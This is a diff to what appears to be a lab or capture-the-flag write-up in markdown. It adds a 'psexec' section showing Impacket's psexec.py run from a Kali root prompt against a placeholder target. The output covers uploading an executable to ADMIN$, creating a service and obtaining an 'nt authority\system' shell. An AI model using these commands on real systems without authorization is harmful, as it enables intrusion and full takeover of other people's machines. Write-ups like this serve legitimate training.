@@ -51,5 +51,26 @@ drwxr-xr-x 2 root root    0 Apr 21  2021  Recovery
 drwxr-xr-x 2 root root    0 Apr 21  2021 'System Volume Information'
 dr-xr-xr-x 2 root root    0 Apr 21  2021  Users
 drwxr-xr-x 2 root root    0 Jul  7  2021  Windows
+```
 
+## psexec
+
+```shell
+┌──(root㉿kali)-[~]
+└─# /usr/share/doc/python3-impacket/examples/psexec.py administrator@{target_IP}
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+Password:
+[*] Requesting shares on {target_IP}.....
+[*] Found writable share ADMIN$
+[*] Uploading file bRTQPNzf.exe
+[*] Opening SVCManager on {target_IP}.....
+[*] Creating service wzRP on {target_IP}.....
+[*] Starting service wzRP.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
 ```
